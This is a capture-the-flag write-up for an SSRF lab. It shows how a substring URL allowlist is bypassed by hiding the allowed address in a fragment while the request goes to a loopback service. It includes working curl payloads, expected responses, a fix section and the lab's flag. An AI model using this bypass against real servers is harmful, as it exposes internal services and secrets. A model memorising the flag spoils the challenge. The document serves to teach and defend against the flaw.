# Adrift SSRF Fragment Allowlist Bypass

## What Is Happening

The [adrift lab](https://e60f6e72b65a.pwnbox-lab.com/) exposes a server-side URL fetcher at `POST /api/fetch`. The UI says allowlisted destinations only, and the challenge requires reading a flag from `127.0.0.1:9000` even though the fetcher is supposed to speak to one address.

## Why It Happens

The security control checks whether the submitted URL string contains the allowed destination:

```text
https://e60f6e72b65a.pwnbox-lab.com/
```

It does not validate the parsed hostname used by the HTTP client. A fragment can include the allowed URL while the actual request goes elsewhere:

```text
http://127.0.0.1:9000/secret#https://e60f6e72b65a.pwnbox-lab.com/
         ^^^^^^^^^^^^^^^^^^^^^^              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         real destination                    satisfies substring allowlist
```

Fragments are not sent to the origin server, so the internal service on port 9000 receives the request normally.

## Exploit Chain

1. Map the fetch endpoint: `POST /api/fetch` with JSON `{ "url": "..." }`.
2. Confirm the only allowed remote fetch is `https://e60f6e72b65a.pwnbox-lab.com/`.
3. Bypass with a fragment containing that exact string.
4. Read internal metadata from loopback root.
5. Fetch the documented `/secret` endpoint.

## Exact Test

Confirm allowlist behavior:

```bash
curl -sS -X POST "https://e60f6e72b65a.pwnbox-lab.com/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"https://e60f6e72b65a.pwnbox-lab.com/"}'
```

Bypass to internal metadata:

```bash
curl -sS -X POST "https://e60f6e72b65a.pwnbox-lab.com/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/#https://e60f6e72b65a.pwnbox-lab.com/"}'
```

Read flag:

```bash
curl -sS -X POST "https://e60f6e72b65a.pwnbox-lab.com/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/secret#https://e60f6e72b65a.pwnbox-lab.com/"}'
```

## Expected Signal

- Allowed host alone returns the public homepage HTML.
- Direct `127.0.0.1:9000` returns `destination not in allowlist`.
- Fragment bypass to root returns:

```text
metadata service
endpoints: /secret
```

- `/secret` returns the flag in the response body.

## Result Interpretation

Confirmed bug chain:

```text
Substring allowlist on raw URL
-> fragment smuggles allowed destination
-> fetch reaches 127.0.0.1:9000
-> internal endpoint disclosure
-> flag exfiltration
```

## Root Cause

Using `includes()` or equivalent substring matching as an SSRF allowlist, without parsing and validating the actual request destination.

## Impact

- Access to loopback-only HTTP services.
- Disclosure of internal endpoints and secrets.
- In other apps, potential reach to metadata, admin APIs, or cloud credentials.

## Fix

- Parse once with a strict URL library.
- Allowlist exact normalized origins after canonicalization.
- Reject fragments, userinfo, and unexpected schemes.
- Block loopback and private destinations after DNS resolution.

## Key Lesson

When a fetcher says it only talks to one address, test whether the allowlist is a parsed-host check or a naive string match. If `@` bypasses fail, try putting the allowed URL in the fragment while pointing the authority at loopback.

## Flag

`pwnbox{f4d1c8a3b9e7206d5c8a1f3b2e9d4607}`
